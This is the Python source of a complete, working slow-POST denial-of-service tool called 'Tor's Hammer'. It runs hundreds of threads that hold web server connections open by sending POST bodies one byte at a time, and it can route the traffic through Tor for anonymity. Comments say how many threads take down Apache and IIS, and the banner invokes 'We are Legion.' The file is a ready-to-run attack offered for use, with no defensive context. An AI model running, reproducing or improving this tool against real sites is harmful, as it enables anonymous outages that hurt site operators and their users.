#!/usr/bin/env python3

# this assumes you have the socks.py (http://phiral.net/socks.py) in the
# same directory and that you have tor running locally
# on port 9150. run with 128 to 256 threads to be effective.
# kills apache 1.X with ~128, apache 2.X / IIS with ~256
# not effective on nginx

import time
import sys
import random
import getopt
import socks
import string
import ssl

from urllib.parse import urlparse
from threading import Thread

global stop_now

stop_now = False

def get_useragent_list():
	with open('user-agents.txt') as f:
		return f.read().splitlines()

useragents = get_useragent_list()

class HttpPostThread(Thread):
    def __init__(self, thread_id, target, tor):
        Thread.__init__(self)
        self.thread_id = thread_id
        self.tor = tor
        self.transport = None
        self.running = True
        url = urlparse(target)
        self.host = url.hostname
        self.path = url.path or '/'
        self.port = url.port if url.port else 443 if url.scheme == 'https' else 80
        self._init_socket()

    def _init_socket(self):
        self.socket = socks.socksocket()
        if self.tor:
            self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)

    def _log(self, msg):
        print(f'[Thread #{self.thread_id}] {msg}')

    def _format_error_message(self, err):
        return err.msg if hasattr(err, 'msg') else f'{err.errno} {err.strerror}'

    def _send_http_post(self):
        global stop_now

        payload_length = random.randint(5000, 10000)
        headers_list = [
            f'POST {self.path} HTTP/1.1',
            f'Host: {self.host}',
            f'User-Agent: {random.choice(useragents)}',
            'Connection: keep-alive',
            'Keep-Alive: timeout=900, max=1000',
            f'Content-Length: {payload_length}',
            'Content-Type: application/x-www-form-urlencoded',
        ]
        headers = '\r\n'.join(headers_list)
        self.transport.send(headers.encode())
        self.transport.send(b'\r\n\r\n')
        self._log(f'Sent headers:\n{headers}\n')

        for i in range(0, payload_length - 1):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.ascii_letters + string.digits)
            self._log(f'Posting byte {i + 1} out of {payload_length}: {p}')
            self.transport.send(p.encode())
            time.sleep(random.uniform(0.5, 4))

        self.transport.close()

    def _connect(self):
        self.socket.connect((self.host, self.port))
        self.transport = self.socket if self.port != 443 else ssl.wrap_socket(self.socket)

    def run(self):
        while self.running:
            while self.running:
                try:
                    self._log(f'Connecting to {self.host}:{self.port}...')
                    self._connect()
                    break
                except Exception as e:
                    self._log(f'Error connecting to {self.host}:{self.port}: {self._format_error_message(e)}')
                    self._init_socket()
                    time.sleep(1)

            while self.running:
                try:
                    self._send_http_post()
                except Exception as e:
                    self._log(f'Connection closed, error: {self._format_error_message(e)}. Restarting...')
                    self._init_socket()
                    time.sleep(1)
                    break

def usage():
    print('./torshammer.py -t <target> [-r <threads> -T -h]')
    print(' -t|--target <URL including protocol, host and path>')
    print(' -r|--threads <Number of threads> Defaults to 256')
    print(' -T|--tor Enable anonymising through tor on 127.0.0.1:9150')
    print(' -h|--help Shows this help\n')
    print('Eg. ./torshammer.py -t 192.168.1.100 -r 256\n')

def main(argv):
    try:
        opts, args = getopt.getopt(argv, 'hTt:r:', ['help', 'tor', 'target=', 'threads='])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    threads = 256
    tor = False

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit(0)
        if o in ('-T', '--tor'):
            tor = True
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-r', '--threads'):
            threads = int(a)

    if target == '' or threads <= 0:
        usage()
        sys.exit(-1)

    print('\n* Target: %s' % (target))
    print('* Threads: %d Tor: %s' % (threads, tor))
    print('* Give 20 seconds without tor or 40 with before checking site\n')

    rthreads = []
    for i in range(threads):
        t = HttpPostThread(i, target, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.is_alive()]
        except KeyboardInterrupt:
            print('\nShutting down threads...\n')
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == '__main__':
    print('* Tor''s Hammer ')
    print('* Slow POST DoS Testing Tool')
    print('* entropy [at] phiral.net')
    print('* Anon-ymized via Tor')
    print('* We are Legion.')

    main(sys.argv[1:])
